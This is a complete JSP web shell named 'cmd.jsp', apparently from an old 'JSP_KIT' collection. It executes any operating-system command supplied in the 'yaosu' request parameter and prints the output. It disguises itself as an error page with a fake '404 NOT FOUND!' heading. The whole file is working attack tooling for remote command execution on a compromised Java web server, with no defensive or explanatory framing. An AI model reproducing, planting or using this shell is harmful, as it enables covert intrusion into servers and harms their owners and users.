<%@ page import="java.util.*,java.io.*"%>
<%
//
// JSP_KIT
//
// cmd.jsp = Command Execution (unix)
//
// by: Unknown
// modified: 27/06/2003
//
%>
<HTML><BODY>
<h1>404 NOT FOUND!</h1>
<pre>
<%
if (request.getParameter("yaosu") != null) {
        out.println("Command: " + request.getParameter("yaoso") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("yaosu"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>